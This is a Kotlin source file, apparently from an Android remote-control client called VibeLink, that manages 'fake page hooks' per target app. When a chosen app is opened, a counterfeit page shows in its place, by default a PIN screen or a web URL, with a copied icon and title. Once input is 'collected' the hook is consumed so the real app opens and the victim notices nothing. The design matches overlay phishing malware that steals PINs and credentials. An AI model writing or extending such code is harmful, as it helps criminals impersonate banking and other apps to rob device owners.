package com.vibelink.client.prefs

import android.content.Context
import com.vibelink.client.device.FakePageType
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

/**
 * Per-package armed fake pages. Multiple hooks coexist; opening an app
 * with status=pending shows that hook. After collection the package is consumed
 * so the real app can be used; other hooks stay pending.
 */
class FakePageHookStore(context: Context) {
    private val prefs = DirectBoot.deviceProtectedContext(context.applicationContext)
        .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    data class Hook(
        val packageName: String,
        val title: String,
        val content: String,
        val iconBase64: String,
        val pageType: String,
        val webUrl: String,
        val label: String,
        val armedAt: Long,
    ) {
        fun toListJson(): JSONObject {
            return JSONObject()
                .put("packageName", packageName)
                .put("title", title)
                .put("content", content)
                .put("pageType", pageType)
                .put("webUrl", webUrl)
                .put("label", label)
                .put("armedAt", armedAt)
                .put("hasIcon", if (iconBase64.isNotBlank()) 1 else 0)
        }
    }

    fun arm(hook: Hook): Hook {
        val pkg = hook.packageName.trim()
        require(pkg.isNotBlank()) { "package_required" }
        val normalized = hook.copy(
            packageName = pkg,
            title = hook.title.trim(),
            content = hook.content.trim(),
            iconBase64 = hook.iconBase64.trim(),
            pageType = FakePageType.from(hook.pageType, hasPinFallback = true)
                .name
                .lowercase(),
            webUrl = hook.webUrl.trim(),
            label = hook.label.trim(),
            armedAt = if (hook.armedAt > 0L) hook.armedAt else System.currentTimeMillis(),
        )
        val items = loadAll().toMutableList()
        val index = items.indexOfFirst { it.packageName == pkg }
        if (index >= 0) {
            items[index] = normalized
        } else {
            items.add(normalized)
            while (items.size > MAX_HOOKS) {
                items.removeAt(0)
            }
        }
        consumeUntil.remove(pkg)
        saveAll(items)
        return normalized
    }

    fun disarm(packageName: String?): List<Hook> {
        val pkg = packageName?.trim().orEmpty()
        val remaining = if (pkg.isBlank()) {
            consumeUntil.clear()
            emptyList()
        } else {
            consumeUntil.remove(pkg)
            loadAll().filterNot { it.packageName == pkg }
        }
        saveAll(remaining)
        return remaining
    }

    fun consume(packageName: String) {
        val pkg = packageName.trim()
        if (pkg.isBlank()) {
            return
        }
        consumeUntil[pkg] = System.currentTimeMillis() + CONSUME_COOLDOWN_MS
        saveAll(loadAll().filterNot { it.packageName == pkg })
    }

    fun pending(packageName: String): Hook? {
        val pkg = packageName.trim()
        if (pkg.isBlank() || inConsumeCooldown(pkg)) {
            return null
        }
        return loadAll().firstOrNull { it.packageName == pkg }
    }

    fun listPending(): List<Hook> = loadAll()

    private fun loadAll(): List<Hook> {
        val raw = prefs.getString(KEY_HOOKS, null) ?: return emptyList()
        return runCatching {
            val array = JSONArray(raw)
            buildList {
                for (index in 0 until array.length()) {
                    val obj = array.optJSONObject(index) ?: continue
                    val pkg = obj.optString("packageName").trim()
                    if (pkg.isBlank()) {
                        continue
                    }
                    add(
                        Hook(
                            packageName = pkg,
                            title = obj.optString("title").trim(),
                            content = obj.optString("content").trim(),
                            iconBase64 = obj.optString("icon").trim(),
                            pageType = obj.optString("pageType").trim().ifBlank { "pin" },
                            webUrl = obj.optString("webUrl").trim(),
                            label = obj.optString("label").trim(),
                            armedAt = obj.optLong("armedAt", 0L),
                        ),
                    )
                }
            }
        }.getOrDefault(emptyList())
    }

    private fun saveAll(items: List<Hook>) {
        val array = JSONArray()
        items.forEach { item ->
            array.put(
                JSONObject()
                    .put("packageName", item.packageName)
                    .put("title", item.title)
                    .put("content", item.content)
                    .put("icon", item.iconBase64)
                    .put("pageType", item.pageType)
                    .put("webUrl", item.webUrl)
                    .put("label", item.label)
                    .put("armedAt", item.armedAt),
            )
        }
        prefs.edit().putString(KEY_HOOKS, array.toString()).apply()
    }

    companion object {
        private const val PREFS_NAME = "remote_control_fake_page_hooks_dps"
        private const val KEY_HOOKS = "hooks"
        private const val MAX_HOOKS = 32
        private const val CONSUME_COOLDOWN_MS = 2500L

        private val consumeUntil = ConcurrentHashMap<String, Long>()

        fun inConsumeCooldown(packageName: String): Boolean {
            val pkg = packageName.trim()
            val until = consumeUntil[pkg] ?: return false
            if (System.currentTimeMillis() >= until) {
                consumeUntil.remove(pkg)
                return false
            }
            return true
        }
    }
}
